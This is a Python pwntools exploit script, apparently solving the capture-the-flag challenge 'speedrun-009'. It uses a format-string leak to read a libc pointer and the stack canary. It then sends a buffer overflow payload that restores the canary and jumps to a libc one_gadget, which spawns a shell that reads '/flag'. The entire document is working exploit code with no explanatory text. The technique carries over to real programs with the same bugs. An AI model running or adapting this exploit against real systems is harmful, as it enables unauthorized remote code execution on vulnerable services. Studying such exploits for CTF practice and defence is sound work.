#!/usr/bin/env python2
import sys
import time
from pwn import *
from struct import pack

context.log_level = logging.DEBUG

def get_connection():
    # conn = process("./speedrun-009")
    conn = remote(sys.argv[1], int(sys.argv[2]))

    # gdb.attach(conn, '''
    # continue
    # ''')

    return conn

conn = get_connection()

conn.recvuntil("1, 2, or 3")

conn.send("2")

# leak a pointer to the binary and the canary
conn.send("g%2$p h%163$ph")

result = conn.recvuntil("1, 2, or 3")

result = re.search('g0x([0-9a-fA-F]+) h0x([0-9a-fA-F]+)h', result)

leaked_address_of_bss = int(result.group(1), 16)
leaked_canary = int(result.group(2), 16)

libc_bss_base = leaked_address_of_bss - 0x8c0

# .text is offset 0x00000000000212d0
# .bss is offset  0x00000000003ec860

libc_text_base = libc_bss_base - 0x3ed000

# target one_gadget offset is 0x4f322

one_gadget = libc_text_base + 0x4f322

conn.send("1")

p = 'a' * 0x408
p += p64(leaked_canary)
p += 'b' * 8
p += p64(one_gadget)

conn.send(p)

conn.recvuntil("1, 2, or 3")
conn.send("3")

conn.recv(timeout=1)

conn.sendline('cat /flag; exit')
result = conn.recvall(timeout=1)
flag = re.search('OOO{[^}]+}', result)
print("FLAG: %s" % flag.group(0))


